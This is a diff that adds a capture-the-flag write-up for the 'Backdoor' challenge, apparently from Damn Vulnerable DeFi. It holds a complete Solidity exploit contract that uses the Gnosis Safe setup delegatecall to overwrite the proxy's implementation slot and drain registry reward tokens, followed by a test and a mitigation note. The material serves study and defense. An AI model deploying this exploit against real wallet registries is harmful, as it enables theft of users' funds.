@@ -747,3 +747,144 @@ function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
         return priceToPay;
     }
 ```
+
+## Challenge #11 - Backdoor
+To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.
+
+To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.
+
+Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.
+
+Your goal is to take all funds from the registry. In a single transaction.
+
+### Malicious delegate call during wallet proxy initialization
+
+During proxy wallet creation via `GnosisSafeProxyFactory.sol` one can chose to include a delegate call on a proxy creation inside an initializer
+
+```
+function setup(
+        address[] calldata _owners,
+        uint256 _threshold,
+        address to, // send delegate call tot his address
+        bytes calldata data, // delegate call data
+        address fallbackHandler,
+        address paymentToken,
+        uint256 payment,
+        address payable paymentReceiver
+    ) external {
+```
+
+Later during an initialization with the `setup` function a newly created proxy will call `to` address with `data` inside the `setupMoules` function
+
+```
+    function setupModules(address to, bytes memory data) internal {
+        require(modules[SENTINEL_MODULES] == address(0), "GS100");
+        modules[SENTINEL_MODULES] = SENTINEL_MODULES;
+        if (to != address(0))
+            // Setup has to complete successfully or transaction fails.
+            require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), "GS000"); //delegate call here
+    }
+```
+
+This may be a foundation for an exploit as we know that during `delegatecall` we call another contract with proxy storage and it's address as a msg.sender. An attacker can use it to execute a malicous code with the proxy context. There are numerous scenarios including calling ERC20 `approve`, installing dangerous modules with `enableModule` or even swapping legit implementation.
+
+### Proof of concept
+
+Here is the contract that swaps legit Gnosis master copy address to a malicious one. Attack scenario:
+- we have a contract that rewards users who create gnosis wallets via factory callback `proxyCreated`. There are number of checks, unfortunately none of them can tell that the proxy we created is the bad one.
+- during attack we create a fake GnosisSafe wallet that includes `drainTokens` function
+- then we create wallets for each user with a factory with an initializer that points to our contract to delegate call to
+- during initialization proxy calls `callback` function where we manipulate it's storage's slot(0) - just where a singleton address is stored and change it to our fake wallet address
+- and just like that we can call `drainFunds` function on user's wallets successfully depleting them from their reward tokens
+
+```
+// SPDX-License-Identifier: MIT
+
+import "../backdoor/WalletRegistry.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+
+pragma solidity ^0.8.0;
+
+contract GnosisNotSafe is GnosisSafe{
+    function drainTokens(address token, address to) external {
+        uint256 bal = IERC20(token).balanceOf(address(this));
+        IERC20(token).transfer(to, bal);
+    }
+}
+
+contract BackdoorExploit {
+    WalletRegistry public immutable registry;
+    GnosisSafeProxyFactory public immutable factory;
+    IERC20 public immutable DVT;
+
+    constructor (WalletRegistry _registry, GnosisSafeProxyFactory _factory, IERC20 _DVT) {
+        registry = _registry;
+        factory = _factory;
+        DVT = _DVT;
+    }
+
+    function attack(address[] calldata owners, uint256 threshold) external {
+        address singleton = registry.masterCopy();
+        uint256 salt = 777;
+        address[] memory ownersTemp = new address[](1); 
+
+        for(uint i=0; i<owners.length; i++) {
+            ownersTemp[0] = owners[i];
+            GnosisNotSafe fake = new GnosisNotSafe();
+            // Create new proxy for the beneficiary
+            bytes memory initializer = getInitializer(ownersTemp, threshold, address(fake));
+            GnosisSafeProxy proxy = factory.createProxyWithCallback(
+                singleton,
+                initializer,
+                salt,
+                IProxyCreationCallback(registry)
+            );
+            ++salt;
+            // Transfer tokens from a wallet
+            GnosisNotSafe(payable(proxy)).drainTokens(address(DVT), msg.sender); 
+        }
+
+    }
+
+    function getInitializer(
+        address[] memory owner,
+        uint256 threshold,
+        address fake
+    ) public view returns(bytes memory initializer) {
+        initializer = abi.encodeWithSignature(
+            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
+            owner,
+            threshold,
+            address(this),
+            abi.encodeWithSignature("callback(address)", fake),
+            address(0),
+            0,
+            0,
+            address(0)
+        );
+    }
+
+    function callback(address fake) external {
+        // replace safe implementation with our fake contract
+        assembly {
+            sstore(0x00, fake)    // store in storage at 0x00
+        }
+    }
+
+    receive() external payable {}
+}
+```
+
+Tests `backdoor.challenge.js`
+
+```
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const Exploit = await ethers.getContractFactory('BackdoorExploit');
+        exploit = await Exploit.deploy(walletRegistry.address, walletFactory.address, token.address);
+        await exploit.connect(player).attack(users, 1);
+    });
+```
+
+### Mitigation 
+We should treat externally created wallets with great caution because we never know what code was executed during their creation. To mitigate this we should accept wallets only from whitelisted users, or check and revert inside `proxyCreated` if initializer contains `to` address that is not zero.
